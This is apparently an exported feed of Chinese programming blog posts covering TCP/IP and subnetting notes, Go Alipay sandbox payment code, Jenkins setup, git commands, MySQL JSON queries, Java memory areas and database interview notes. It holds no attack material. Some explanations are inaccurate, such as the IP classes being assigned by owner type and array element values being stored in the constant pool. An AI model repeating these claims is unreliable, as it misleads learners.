第一次挥手：客户端先发送FIN报文（第24帧），用来关闭主动方到被动关闭方的数据传送，也就是客户端告诉服务器：我已经不会再给你发数据了(当然，在fin包之前发送出去的数据，如果没有收到对应的ack确认报文，客户端依然会重发这些数据)，但此时客户端还可以接受数据。 第二次挥手：Server端接到FIN报文后，但是如果还有数据没有发送完成，则不必急着关闭Socket，可以继续发送数据。所以服务器端先发送ACK（第25帧），告诉Client端：请求已经收到了，但是我还没准备好，请继续等待停止的消息。这个时候Client端就进入FIN_WAIT状态，继续等待Server端的FIN报文。 第三次挥手：当Server端确定数据已发送完成，则向Client端发送FIN报文（第26帧），告诉Client端：服务器这边数据发完了，准备好关闭连接了。 第四次挥手：Client端收到FIN报文后，就知道可以关闭连接了，但是他还是不相信网络，所以发送ACK后进入TIME_WAIT状态（第27帧）， Server端收到ACK后，就知道可以断开连接了。Client端等待了2MSL后依然没有收到回复，则证明Server端已正常关闭，最后，Client端也可以关闭连接了至此，TCP连接就已经完全关闭了！ 2. IP地址2.1 IP分类 A、B、C、D、E五类地址 A类地址由政府机构使用。区别：A类地址的第1字节是网络的地址，其它的3个字节为主机的地址。A类地址范围为：1.0.0.1-126.255.255.254。 B类地址有中等等级公司使用。区别：B类地址的第1字节和第2字节是网络地址，其它2个字节为主机的地址。B类地址范围：128.0.0.1—191.255.255.254。 C类地址分配给需要的个人。区别：C类地址第1字节、第2字节和第3个字节为网络地址，最后一个字节为主机地址。并且第1个字节的前三位都是110。C类地址范围：192.0.0.1—223.255.255.254。 D类地址用于组播。区别：D类地址不分网络地址和主机地址，但它的第1个字节的前四位都是1110。D类地址范围：224.0.0.1—239.255.255.254 E类地址用于实验。区别：E类地址也不分网络地址和主机地址，但它的第1个字节的前五位都是11110。E类地址范围：240.0.0.1—255.255.255.254 2.2 求子网数和主机数202.112.78.0 是个C类IP 前3位为网络位 最后一位是主机位子网掩码是255.255.255.192（11111111.11111111.11111111.11000000）说明 向主机位借2位 （11000000 11为子网 000000为主机）所以 n = 2 ，m = 6 求子网数公式： 2的n次方-2 = 可划分的子网数 n=2 所以可以划分2个子网 求主机数公式： 2的m次方 - 2 = 每个子网的主机主机数 又因为m=6 2.3 求子网掩码 利用子网数来计算 在求子网掩码之前必须先搞清楚要划分的子网数目，以及每个子网内的所需主机数目。 1)将子网数目转化为二进制来表示 2)取得该二进制的位数，为 N 3)取得该IP地址的类子网掩码，将其主机地址部分的的前N位置 1 即得出该IP地址划分子网的子网掩码。 如欲将B类IP地址168.195.0.0划分成27个子网： 1)27=11011 2)该二进制为五位数，N = 5 3)将B类地址的子网掩码255.255.0.0的主机地址前5位置 1，得到 255.255.248.0 即为划分成 27个子网的B类IP地址 168.195.0.0的子网掩码。 利用主机数来计算 1)将主机数目转化为二进制来表示 2)如果主机数小于或等于254（注意去掉保留的两个IP地址），则取得该主机的二进制位数，为 N，这里肯定 N&lt;8。如果大于254，则 N&gt;8，这就是说主机地址将占据不止8位。 3)使用255.255.255.255来将该类IP地址的主机地址位数全部置1，然后从后向前的将N位全部置为 0，即为子网掩码值。 3. TCP/IP协议3.1 概念 TCP/IP协议是一个协议集合。大家叫的时候方便说，所以统称为TCP/IP。TCP/IP协议族中有一个重要的概念是分层，TCP/IP协议按照层次分为以下四层。应用层、传输层、网络层、数据链路层。为什么要分层？这就如同邓小平1978年的大包干，责任到人。一个层只负责一个层次的问题，如果出问题了，和其他的层次无关，只要维护这个层次也就好了。其实编程语言里也能体现这个分层理论，即封转性、隔离。 TCP/IP通信数据流 3.2 IP协议属于网络层 IP协议：IP(Internet protocol),这里的IP不是值得我们通常所说的192.168.1.1.这个IP指的是一种协议，而后面的数字值得是IP地址。IP协议的作用在于把各种数据包准确无误的传递给对方，其中两个重要的条件是IP地址，和MAC地址（Media Access Control Address）。由于IP地址是稀有资源，不可能每个人都拥有一个IP地址，所以我们通常的IP地址是路由器给我们生成的IP地址，路由器里面会记录我们的MAC地址。而MAC地址是全球唯一的，除去人为因素外不可能重复。举一个现实生活中的例子，IP地址就如同是我们居住小区的地址，而MAC地址就是我们住的那栋楼那个房间那个人。 3.3 ARP协议属于数据链路层使用 ARP 协议凭借 MAC 地址进行通信 IP 间的通信依赖 MAC 地址。在网络上，通信的双方在同一局域网（LAN）内的情况是很少的，通常是经过多台计算机和网络设备中转才能连接到对方。而在进行中转时，会利用下一站中转设备的 MAC 地址来搜索下一个中转目标。这时，会采用 ARP 协议（Address Resolution Protocol）。ARP 是一种用以解析地址的协议，根据通信方的 IP 地址就可以反查出对应的 MAC 地址 3.4 TCP协议属于传输层如果说IP协议是找到对方的详细地址。那么TCP协议就是把安全的把东西带给对方。各有分工，互不冲突。 按层次分，TCP属于传输层，提供可靠的字节流服务。什么叫字节流服务呢？这个名字听起来让人不知所以然，下面听下我通俗的解释。所谓的字节流，其实就类似于信息切割。比如你是一个卖自行车的，你要去送货。安装好的自行车，太过庞大，又不稳定，容易损伤。不如直接把自行车拆开来，每个零件上都贴上收货人的姓名。最后送到后按照把属于同一个人的自行车再组装起来，这个拆解、运输、拼装的过程其实就是TCP字节流的过程。 用漫画来表示三次握手 3.5 DNS协议属于应用层DNS：DNS(Domain names System) 和HTTP协议一样是处于应用层的服务，提供域名到IP地址之间的解析服务。 互联网之间是通过IP地址通信的，但是IP地址并不符合认得记忆习惯，人喜欢记忆有意义的字词。所以DNS服务就为了解决这个问题而生了。其实很好理解，形如我们电脑中host文件，当我们添加下面一句配置后：192.168.1.11 roverliang.com当我们访问roverliang.com 的时候，电脑便不会去外网服务器上查询了，直接去访问192.168.1.111。这是一个简单的域名劫持，足以说明DNS的涵义了。 用一个漫画表示DNS解析过程 4. 七层架构与五层架构*TCP/IP五层模型: * 物理层 数据链路层：ARP,RARP 网络层： IP,ICMP,IGMP 传输层：TCP ,UDP,UGP 应用层：Telnet,FTP,SMTP,SNMP,DNS OSI模型: 物理层：EIA/TIA-232, EIA/TIA-499, V.35, V.24, RJ45, Ethernet, 802.3, 802.5, FDDI, NRZI, NRZ, B8ZS 数据链路层：Frame Relay, HDLC, PPP, IEEE 802.3/802.2, FDDI, ATM, IEEE 802.5/802.2 网络层：IP，IPX，AppleTalk DDP 传输层：TCP，UDP，SPX 会话层：RPC,SQL,NFS,NetBIOS,names,AppleTalk,ASP,DECnet,SCP 表示层:TIFF,GIF,JPEG,PICT,ASCII,EBCDIC,encryption,MPEG,MIDI,HTML 应用层：FTP,WWW,Telnet,NFS,SMTP,Gateway,SNMP 对应关系： 对应的协议 对应的设备]]></content>
      <categories>
        <category>面试</category>
      </categories>
      <tags>
        <tag>计算机网络</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[golang对接支付宝支付]]></title>
    <url>%2F2019%2F09%2F15%2Fgolang%E5%AF%B9%E6%8E%A5%E6%94%AF%E4%BB%98%E5%AE%9D%E6%94%AF%E4%BB%98%2F</url>
    <content type="text"><![CDATA[本文采用沙箱环境 1. 开启沙箱文档：https://docs.open.alipay.com/200/105311/沙箱地址：https://openhome.alipay.com/platform/appDaily.htm 2. 生成应用公钥和秘钥（已弃用） 本文中的签名方法默认为 RSA2，采用支付宝提供的 RSA签名&amp;验签工具 生成秘钥时，秘钥的格式必须为 PKCS1，秘钥长度推荐 2048。所以在支付宝管理后台请注意配置 RSA2(SHA256)密钥。生成秘钥对之后，将公钥提供给支付宝（通过支付宝后台上传）对我们请求的数据进行签名验证，我们的代码中将使用私钥对请求数据签名。 RSA签名和验证工具下载：https://docs.open.alipay.com/291/105971 下载之后解压 双击RSA签名验签工具.bat 秘钥格式选择PKCS1 点击生成秘钥 复制公钥 回到沙箱中，点击查看应用公钥，然后点击修改 保存好私钥，我们一会需要在代码中用到 复制支付宝公钥，代码中验证需要用到 配置支付成功后的回调地址（这必须是个公网地址）3. 证书认证 目前新创建的支付宝应用只支持证书方式认证，已经弃用之前的公钥和私钥的方式 公钥秘钥说明 我们生成秘钥对之后，将公钥提供给支付宝（通过支付宝后台上传）对我们请求的数据进行签名验证，我们的代码中使用私钥对请求数据签名。 证书签名请求文件（用来提交给支付宝后台生成证书的） 应用私钥（调用支付宝接口的时候，我们需要使用该私钥对参数进行签名） 支付宝公钥证书（用来验证我们的签名的，现在已经被支付宝公钥证书取代） 3.1 下载生成工具下载地址与文档：https://docs.open.alipay.com/291/105971 3.2 生成csr证书签名请求文件工具安装好之后打开，点击获取 3.3 输入信息 主要是组织/公司这块一定要写的和你支付宝中应用的名一样，不然不会通过的，填写完毕之后点击生成CSR文件 ，点击页面的打开文件位置，就可以看到三个文件了，分别是证书签名请求文件，应用公钥，应用私钥 3.4 上传CSR证书签名请求文件 回到支付宝后台，点击 接口加签方式 设置，选择公钥证书，点击上次CSR生成证书，把我们刚才生成的那个证书(.csr)上传进去 3.5 下载证书上传好之后，会弹出让你下载证书的页面，把那三个证书都下载下来，分别是: 应用公钥证书，支付宝公钥证书，支付宝根证书 代码部分下载第三方库go get github.com/smartwalle/alipay/v3 1. 网页扫码支付123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109package mainimport ( "fmt" "github.com/smartwalle/alipay" "net/http" "os/exec" "strings" "time")var ( // appId appId = "" // 应用公钥 aliPublicKey = "" // 应用私钥 privateKey = "" client, _ = alipay.New(appId, aliPublicKey, privateKey, false))func init() &#123; client.LoadAppPublicCert("应用公钥证书") client.LoadAliPayPublicCert("支付宝公钥证书") client.LoadAliPayRootCert("支付宝根证书")&#125;//网站扫码支付func WebPageAlipay() &#123; pay := alipay.AliPayTradePagePay&#123;&#125; // 支付宝回调地址（需要在支付宝后台配置） // 支付成功后，支付宝会发送一个POST消息到该地址 pay.NotifyURL = "http://www.pibigstar/alipay" // 支付成功之后，浏览器将会重定向到该 URL pay.ReturnURL = "http://localhost:8088/return" //支付标题 pay.Subject = "支付宝支付测试" //订单号，一个订单号只能支付一次 pay.OutTradeNo = time.Now().String() //销售产品码，与支付宝签约的产品码名称,目前仅支持FAST_INSTANT_TRADE_PAY pay.ProductCode = "FAST_INSTANT_TRADE_PAY" //金额 pay.TotalAmount = "0.01" url, err := client.TradePagePay(pay) if err != nil &#123; fmt.Println(err) &#125; payURL := url.String() //这个 payURL 即是用于支付的 URL，可将输出的内容复制，到浏览器中访问该 URL 即可打开支付页面。 fmt.Println(payURL) //打开默认浏览器 payURL = strings.Replace(payURL,"&amp;","^&amp;",-1) exec.Command("cmd", "/c", "start",payURL).Start()&#125;//手机客户端支付func WapAlipay() &#123; pay := alipay.AliPayTradeWapPay&#123;&#125; // 支付成功之后，支付宝将会重定向到该 URL pay.ReturnURL = "http://localhost:8088/return" //支付标题 pay.Subject = "支付宝支付测试" //订单号，一个订单号只能支付一次 pay.OutTradeNo = time.Now().String() //商品code pay.ProductCode = time.Now().String() //金额 pay.TotalAmount = "0.01" url, err := client.TradeWapPay(pay) if err != nil &#123; fmt.Println(err) &#125; payURL := url.String() //这个 payURL 即是用于支付的 URL，可将输出的内容复制，到浏览器中访问该 URL 即可打开支付页面。 fmt.Println(payURL) //打开默认浏览器 payURL = strings.Replace(payURL,"&amp;","^&amp;",-1) exec.Command("cmd", "/c", "start",payURL).Start()&#125;func main() &#123; //生成支付URL WapAlipay() //支付成功之后的返回URL页面 http.HandleFunc("/return", func(rep http.ResponseWriter, req *http.Request) &#123; req.ParseForm() ok, err := client.VerifySign(req.Form) if err == nil &amp;&amp; ok &#123; rep.Write([]byte("支付成功")) &#125; &#125;) //支付成功之后的通知页面 http.HandleFunc("/alipay", func(rep http.ResponseWriter, req *http.Request) &#123; var noti, _ = client.GetTradeNotification(req) if noti != nil &#123; fmt.Println("支付成功") //修改订单状态。。。。 &#125; else &#123; fmt.Println("支付失败") &#125; alipay.AckNotification(rep) // 确认收到通知消息 &#125;) fmt.Println("server start....") http.ListenAndServe(":8088", nil)&#125;]]></content>
      <categories>
        <category>go</category>
      </categories>
      <tags>
        <tag>支付宝</tag>
        <tag>golang</tag>
        <tag>打开浏览器</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux安装Jenkins]]></title>
    <url>%2F2019%2F09%2F15%2FLinux%E5%AE%89%E8%A3%85Jenkins%2F</url>
    <content type="text"><![CDATA[环境：Centos、JDK1.8 1. 下载安装Jenkins点击查看官网详细安装 安装稳定版，依次执行下面语句： 12345sudo wget -O /etc/yum.repos.d/jenkins.repo http://pkg.jenkins-ci.org/redhat-stable/jenkins.reposudo rpm --import https://jenkins-ci.org/redhat/jenkins-ci.org.keysudo yum install jenkins 2. 修改JDK路径查看当前JDK安装路径 1echo $JAVA_HOME 修改Jenkins启动时搜索的JDK路径 1vi /etc/rc.d/init.d/jenkins 将这个改为你的JDK路径，也就是echo $JAVA_HOME输出的内容加上 /bin/java 3. 修改端口1vi /etc/sysconfig/jenkins 将JENKINS_PORT=”8080”修改为JENKINS_PORT=”9000” 4. 重启Jenkins1service jenkins restart 5. 进入网站开始布置打开http://你的ip:9000开始布置Jenkins]]></content>
      <categories>
        <category>工具使用,Linux</category>
      </categories>
      <tags>
        <tag>jenkins</tag>
        <tag>Linux</tag>
        <tag>持续集成</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[git高级使用]]></title>
    <url>%2F2019%2F09%2F12%2Fgit%E9%AB%98%E7%BA%A7%E4%BD%BF%E7%94%A8%2F</url>
    <content type="text"><![CDATA[此篇是为了我以后回顾而写的，所以写的有点简单，也有点乱，如果想系统的学习，请去这个网站：https://learngitbranching.js.org 此网站常用命令 123456# 回到关卡选择页面levels# 查看答案show solution# 重新开始level advance3 1. rebase 合并分支我在bugFix分支来rebase master分支，那么我这个bugFix 分支就是基于master分支的一个新的节点 1234# 切换到bugFix分支git checkout bugFix # 让bugFix分支融合master分支的内容git rebase master 合并提交 12# 合并这次与上次提交git rebase -i HEAD~2 解决远程仓库fast-forward当我们提交代码时，可能别人已经提交过内容到远程仓库了，这时我们提交代码时就会提醒我们fast-forward，让我们先更新下代码再提交，我们可以用rebase很快的解决这个问题。 1234# 先拉取最新代码进行rebasegit pull --rebase origin master# 然后再提交git push 本地分支与远程分支关联将本地master分支与远程master分支关联，这样可以在master分支中直接执行git pull进行拉取代码，不用再指定后面的分支 1git branch --set-upstream-to=origin/master master 2. merge 我在master分支来merge bugFix分支，那么我这个master分支就是在master分支的基础上再次融合bugFix分支的内容。 1234# 切换到master分支git checkout master# 融合bugFix分支的内容git merge bugFix 3. checkout 移动当前分支也可以理解为回滚上一次提交，放弃本次提交的修改，c2是通过git log进行查看的 commit id 1git checkout c2 移动某个分支 移动提交记录。也可以理解为回滚，回滚到上一次提交，移动分支到某个提交记录处， 1git branch -f bugFix c2 也可以直接通过HEAD^来指向上一个提交记录，或通过HEAD~3 往上移动3级 12git branch -f bugFix HEAD^git branch -f bugFix HEAD~2 4. reset 回退到上一次提交的版本， 1234# 回到此分支的上一个提交git reset HEAD^# 回到master分支的上一个提交git reset master^ 如果是远程也想要回退到上一个版本，可以使用 1git revert HEAD^ 如果想撤销远程分支上的内容需要使用git revert，它会新创建一个提交，而新创建的提交的状态正好等于你上一个版本的状态，假如我们现在的版本是c2,它上一个版本就是c1，那么执行完这个命令之后，就会新创建一个提交 为 c1’,它与c1的内容一致，我们将这它推送到远程端，别人更新之后就可以了 1git revert HEAD^ 5. cherry-pick 将其他提交，抓过来，放到此分支下面, c2，c2，c7是git log中的commit id 12345# 切换到master分支git checkout master# 将其他分支的提交，拿过来，放到master上，特别注意，这几个记录的顺序问题git cherry-pick c2 c4 c7# 结果: HEAD——&gt; c7——&gt; c4——&gt; c2 6. tag 也就是做个锚点，因为分支是很容易被改变，为了防止以后不能返回，所以可以打个tag，做个回滚记录点 12# c1 为提交记录的idgit tag tag名 c1]]></content>
      <categories>
        <category>工具使用,git</category>
      </categories>
      <tags>
        <tag>git</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MySQL中JSON类型使用]]></title>
    <url>%2F2019%2F09%2F12%2FMySQL%E4%B8%ADJSON%E7%B1%BB%E5%9E%8B%E4%BD%BF%E7%94%A8%2F</url>
    <content type="text"><![CDATA[@[toc] 1. 结构1.1 表结构1234567CREATE TABLE test( id int(10）NOT NULL AUTO_INCREMENT, content JSON default null, arrs JSON default null, PRIMARY KEY (id)); 1.2 content 结构1234type content struct &#123; name string age int&#125; 1.3 arrs 结构1var arrs []int 2. 插入2.1 字符串插入1INSERT INTO test('id','content', 'arrs') VALUES (1,'&#123;"name": "pibigstar","age": 20&#125;', '[1,2,3]' ) 2.2 JSON函数插入1INSERT INTO test('id','content', 'arrs') VALUES (1, JSON_OBJECT("name","pibigstar","age",20), JSON_ARRAY(1,2,3)) 3. 查询 查询JSON中的数据用 column-&gt;path的形式，其中对象类型path的表示方式 .path 3.1 查询内容1SELECT id,content-&gt;'$.name' AS name, content-&gt;'$.age' AS age, arrs-&gt;'$[0]' AS arr1,arrs-&gt;'$[1]' AS arr2 FROM test; 当JSON里面的字段为string时，使用上面的方式查出来内容的带 “”，可使用 -&gt;&gt; 方式去掉 “” 1SELECT id,content-&gt;&gt;'$.name' AS name FROM test; 3.2 搜索条件3.2.1 全匹配1SELECT * FROM test WHERE content = CAST('&#123;"name": "pibigstar","age": 20&#125;' AS JSON); 3.2.2 JSON某字段匹配12SELECT * FROM test WHERE content-&gt;'$.name' = 'pibigstar'; 忽略类型 使用 -&gt;&gt;的方式会忽略其类型 12345# 查不到SELECT * FROM test WHERE category-&gt;'$.age' = '20' # 能查到SELECT * FROM test WHERE category-&gt;&gt;'$.age' = '20' 3.2.2 使用JSON函数1SELECT * FROM test WHERE JSON_CONTAINS(content,'20','$.age'); 4. 更新4.1 全量更新123UPDATE testSET content = JSON_OBJECT("name","haimian","age",22)WHERE id = 1; 4.2 插入新值（不覆盖已存在值）123UPDATE testSET content = JSON_INSERT(content, '$.name', 'haimian', '$.sex', '男')WHERE id = 1; 执行完之后，name值还是 pibigstar，但会新增加一个 sex字段 4.3 插入新值，并覆盖已存在的值123UPDATE testSET content = JSON_SET(content, '$.name', 'haimian', '$.age', 22, '$.sex', '男')WHERE id = 1 执行完之后，name会改变，但会新增加一个 sex字段 4.4 替换某字段值123UPDATE testSET content = JSON_REPLACE(content, '$.name', 'haimian')WHERE id = 1 将name从原先的 pibigstar 改为 haimian，它只会替换已存在的字段的值 4.5 删除某字段的值123UPDATE testSET content = JSON_REMOVE(content, '$.name', '$.age')WHERE id = 1 删除 name 和 age 字段]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>mysql</tag>
        <tag>json</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[浅谈Java中的内存区域划分]]></title>
    <url>%2F2019%2F09%2F12%2F%E6%B5%85%E8%B0%88Java%E4%B8%AD%E7%9A%84%E5%86%85%E5%AD%98%E5%8C%BA%E5%9F%9F%E5%88%92%E5%88%86%2F</url>
    <content type="text"><![CDATA[1. java中内存区域的划分上节谈了Java中的垃圾回收机制，今天我们聊聊Java中内存区域的划分。总得来说Java中内存分为四块：栈、堆、数据域、代码域 1. 栈 栈中主要存放基本类型的数据和对象的引用也就是存放变量。 Java虚拟机会为每一个方法申请一个栈空间，在这个方法中声明的变量都是放到此栈中的，他们会随此方法的调用结束而回收掉。 如果存放的是基本类型数据（普通变量非静态变量），则直接将变量名和值存入栈中的内存中； 如果是引用类型，则将变量名存入栈，然后指向它new出的对象（存放在堆中）。 2. 堆 简单来说就是存放通过关键字new创造出来的对象 3. 数据域数据域分为两块：静态域和常量池 1.静态域 存放被关键字static修饰的变量也就是静态变量如果该静态变量是基本类型则将变量名和值存入静态域，如果是引用类型则指向new出的对象。 2.常量池通俗来讲就是存放那些被final修饰的变量的值 常量池指的是在编译期被确定，并被保存在已编译的.class文件中的一些数据。除了包含代码中所定义的各种基本类型（如int、long等）和对象型（如String及数组）的常量值还包含一些以文本形式出现的符号引用，比如：类和接口的全限定名；字段的名称和描述符；方法和名称和描述符。 4. 代码域 就是放代码的区域 2. 用图来表示例1 普通变量和静态变量的创建代码： 12String str = "hello"; static int a = 1; 这里的str是非静态变量所以将其放入到栈中，而静态变量a则需要放入静态域中，对于变量值”abc”和10则都应该放入到常量池当中 例2 对象的创建代码： 1String str=new String("hello"); 这里的str是String类型的对象，所以放入栈中，而new出来的东西则放入到堆中，对于初始值”hello”则放入到常量池中。 例3 数组的创建代码： 12int s[] = new int[3];s[0]=1;s[1]=2;s[2]=3; 这里的s[]是一个数组变量，所以放入到栈中，new出来的东西还是放入到堆中，最后的每个元素的值则放入到常量池当中]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>jvm</tag>
        <tag>内存区域</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[面试总结---数据库部分]]></title>
    <url>%2F2019%2F09%2F06%2F%E9%9D%A2%E8%AF%95%E6%80%BB%E7%BB%93---%E6%95%B0%E6%8D%AE%E5%BA%93%E9%83%A8%E5%88%86%2F</url>
    <content type="text"><![CDATA[[TOC] 1. 数据库中一些名词的理解1.1 事务是指作为单个逻辑工作单元执行的一系列操作，要么完全地执行，要么完全地不执行。 一个逻辑工作单元要成为事务，必须满足所谓的ACID（原子性、一致性、隔离性和持久性）属性。事务是数据库运行中的一个逻辑工作单位，由DBMS中的事务管理子系统负责事务的处理。 1.1.1 事务的4个特性 原子性(Atomic)：事务必须是原子工作单元；对于其数据修改，要么全都执行，要么全都不执行。通常，与某个事务关联的操作具有共同的目标，并且是相互依赖的。如果系统只执行这些操作的一个子集，则可能会破坏事务的总体目标。原子性消除了系统处理操作子集的可能性。 一致性(Consistency)：事务的一致性指的是在一个事务执行之前和执行之后数据库都必须处于一致性状态。这种特性称为事务的一致性。假如数据库的状态满足所有的完整性约束，就说该数据库是一致的。 隔离性(Isolation)：由并发事务所作的修改必须与任何其它并发事务所作的修改隔离。事务查看数据时数据所处的状态，到底是另一个事务执行之前的状态还是中间某个状态，相互之间存在什么影响，是可以通过隔离级别的设置来控制的。 持久性(Durability)：事务结束后，事务处理的结果必须能够得到固化，即写入数据库文件中即使机器宕机数据也不会丢失，它对于系统的影响是永久性的。 1.1.2 事务并发控制 我们从另外一个方向来说说，如果不对事务进行并发控制，我们看看数据库并发操作是会有那些异常情形，有些使我们可以接受的，有些是不能接受的，注意这里的异常就是特定语境下的，并不一定就是错误什么的。假设有一个order表，有个字段叫count，作为计数用，当前值为100 第一类丢失更新（Update Lost）：此种更新丢失是因为回滚的原因，所以也叫回滚丢失。此时两个事务同时更新count，两个事务都读取到100，事务一更新成功并提交，count=100+1=101，事务二出于某种原因更新失败了，然后回滚，事务二就把count还原为它一开始读到的100，此时事务一的更新就这样丢失了。 脏读（Dirty Read）：此种异常时因为一个事务读取了另一个事务修改了但是未提交的数据。举个例子，事务一更新了count=101，但是没有提交，事务二此时读取count，值为101而不是100，然后事务一出于某种原因回滚了，然后第二个事务读取的这个值就是噩梦的开始。 不可重复读（Not Repeatable Read）：此种异常是一个事务对同一行数据执行了两次或更多次查询，但是却得到了不同的结果，也就是在一个事务里面你不能重复（即多次）读取一行数据，如果你这么做了，不能保证每次读取的结果是一样的，有可能一样有可能不一样。造成这个结果是在两次查询之间有别的事务对该行数据做了更新操作。举个例子，事务一先查询了count，值为100，此时事务二更新了count=101，事务一再次读取count,值就会变成101，两次读取结果不一样。 第二类丢失更新（Second Update Lost）：此种更新丢失是因为更新被其他事务给覆盖了，也可以叫覆盖丢失。举个例子，两个事务同时更新count，都读取100这个初始值，事务一先更新成功并提交，count=100+1=101，事务二后更新成功并提交，count=100+1=101,由于事务二count还是从100开始增加，事务一的更新就这样丢失了。 幻读（Phantom Read）：幻读和不可重复读有点像，只是针对的不是数据的值而是数据的数量。此种异常是一个事务在两次查询的过程中数据的数量不同，让人以为发生幻觉，幻读大概就是这么得来的吧。举个例子，事务一查询order表有多少条记录，事务二新增了一条记录，然后事务一查了一下order表有多少记录，发现和第一次不一样，这就是幻读。 1.2 索引索引好比字典的目录，让你按照一定的规则更快的找到目标数据 为什么需要索引？数据在磁盘上是以块的形式存储的。为确保对磁盘操作的原子性，访问数据的时候会一并访问所有数据块。磁盘上的这些数据块与链表类似，即它们都包含一个数据段和一个指针，指针指向下一个节点（数据块）的内存地址，而且它们都不需要连续存储（即逻辑上相邻的数据块在物理上可以相隔很远）。 举个例子我们有一个数据表User.为了简便，这个表没有主键。Identity | Name | Age | Grade——–|——-|——|——1|Robin|28|905|Lilei|26|60|3|Hanmei|25|50|4|Lucy|27|66|2|Lily|29|80| 虽然这些数据都存在于一个User表中，但是物理上，这些数据可能存储在分散的数据块中。查找Lily这个人的信息, 已知Lily的Identity为2， select * fromUser where Identity= 2. 在查找的时候，首先找到这个表的第一条记录所在的数据库地址，然后发现Identity为1，并不是所需要的值，然后在这个数据库的底端，找到了下一个数据块的地址。（这个类似于链表），如此一来，查询了5次才找到了所需要的值。（为了简单起见，我们考虑Identity不能有重复值）为了加快搜索速度，这里就出现了索引。索引是对某个字段进行排序的一种方式。对表中的某个字段建立索引会创建另一种数据结构，其中保存着字段的值，每个值又指向与它相关的记录。这种索引的数据结构是经过排序的，因而可以对其执行二分查找。 1234/**创建索引*/create index 索引名 on 表名（列名）/**删除索引*/drop index 索引名 2. 数据库三范式 第一范式（1NF） 字段具有原子性,不可再分。 所有关系型数据库系统都满足第一范式）数据库表中的字段都是单一属性的，不可再分。例如，姓名字段，其中的姓和名必须作为一个整体，无法区分哪部分是姓，哪部分是名，如果要区分出姓和名，必须设计成两个独立的字段。 第二范式（2NF） 要有主键，要求其他字段都依赖于主键。 要求数据库表中的每个实例或行必须可以被惟一地区分。通常需要为表加上一个列，以存储各个实例的惟一标识。这个惟一属性列被称为主关键字或主键。第二范式（2NF）要求实体的属性完全依赖于主关键字。所谓完全依赖是指不能存在仅依赖主关键字一部分的属性，如果存在，那么这个属性和主关键字的这一部分应该分离出来形成一个新的实体，新实体与原实体之间是一对多的关系。为实现区分通常需要为表加上一个列，以存储各个实例的惟一标识。简而言之，第二范式就是非主属性非部分依赖于主关键字。 第三范式（3NF） 各种信息只在一个地方存储，不出现在多张表中。 满足第三范式（3NF）必须先满足第二范式（2NF）。简而言之，第三范式（3NF）要求一个数据库表中不包含已在其它表中已包含的非主关键字信息。 所以第三范式具有如下特征： 每一列只有一个值 每一行都能区分。 每一个表都不包含其他表已经包含的非主关键字信息。 3. 表连接3.1 JOIN和UNION的区别 join 是两张表做交连后里面条件相同的部分记录产生一个记录集， union是产生的两个记录集(字段要一样的)并在一起，成为一个新的记录集。 3.2 JOIN联接 JOIN用于按照ON条件联接两个表，主要有四种： 内联接( inner join) 内部联接两个表中的记录，仅当至少有一个同属于两表的行符合联接条件时，内联接才返回行。我理解的是只要记录不符合ON条件，就不会显示在结果集内。 SQL写法： 123SELECT msp.name, party.name FROM msp inner JOIN party ON party=code/**或者*/SELECT msp.name, party.name FROM msp JOIN party ON party=code 左联接（LEFT JOIN / LEFT OUTER JOIN） 外部联接两个表中的记录，并包含左表中的全部记录。如果左表的某记录在右表中没有匹配记录，则在相关联的结果集中右表的所有选择列表列均为空值。理解为即使不符合ON条件，左表中的记录也全部显示出来，且结果集中该类记录的右表字段为空值。 SQL写法： 12SELECT msp.name, party.name FROM msp LEFT JOIN party ON party=code 右联接（RIGHT JOIN / RIGHT OUTER JOIN） 外部联接两个表中的记录，并包含右表中的全部记录。简单说就是和LEFTJOIN反过来。 SQL写法： 12SELECT msp.name, party.name FROM msp RIGHT JOIN party ON msp.party=party.code 全联接（FULL JOIN / FULL OUTER JOIN） 完整外部联接返回左表和右表中的所有行。就是LEFTJOIN和RIGHTJOIN和合并，左右两表的数据都全部显示。 SQL写法： 12SELECT msp.name, party.nameFROM msp FULL JOIN party ON msp.party=party.code 3.3 UNION联接 将两个或更多查询的结果集组合为单个结果集，该结果集包含联合查询中的所有查询的全部行。UNION的结果集列名与UNION运算符中第一个Select语句的结果集的列名相同。另一个Select语句的结果集列名将被忽略。 UNION 与 UNION ALL 的区别： UNION 在进行表链接后会筛选掉重复的记录，所以在表链接后会对所产生的结果集进行排序运算，删除重复的记录再返回结果。实际大部分应用中是不会产生重复的记录. union 检查重复 union all 不做检查 SQL写法： 12/**table1和table2的列名一定要相同*/SELECT * FROM Table1 UNION SELECT * FROM Table2 4.Group by 的使用语法：select 列a,聚合函数 from 表名 where 过滤条件 group by 列a having 过滤条件 4.1 概念与使用对数据进行分组，所谓的分组就是将一个“数据集”划分成若干个“小区域”，然后针对若干个“小区域”进行数据处理 注意:group by 是先排序后分组 一般要使用聚集函数时，group by也会使用如果要用到group by 一般用到的就是“每” 这个字，例如：每个部门有多少人， 就要用到分组的技术，语句如下： 1select DepartmentID,COUNT(*) from Department group by DepartmentID 4.2 聚集函数 SUM 求和 MAX 求最大值 MIN 求最小值 AVG 求平均值 4.3 having的使用having子句限制的是组，而不是行。where子句中不能使用聚集函数，而having子句中可以。 需要注意having和where的用法区别： having只能用在group by之后，对分组后的结果进行筛选(即使用having的前提条件是分组)。 where肯定在group by 之前 where后的条件表达式里不允许使用聚合函数，而having可以。 举个例子：查询每一个班级中年龄大于20，性别为男的人数 12select classid,COUNT(*) from table where sex='男'group by classid,age having age&gt;20 ① 先根据where sex = ‘男’ 拿到所有的男生② 再根据group by classid，age 将所有的男生根据班级id和年龄进行分组③ 再通过having age&gt;20 剔除年龄段小于20 的分组④ 最后通过select count(*)，classid 拿到每个班级的人数 5. SQL分页技术 mysql 123/**pageSize:每页显示多少数据，pageNumber：当前是第几页 */select * from students order by id limit pageSize*(pageNumber-1),pageSize sql Server 123"select top" + pageSize + " * from students where id not in" +"(select top "+ pageSize * (pageNumber-1) + " id from students order by id)" +"order by id oracle 1234String sql 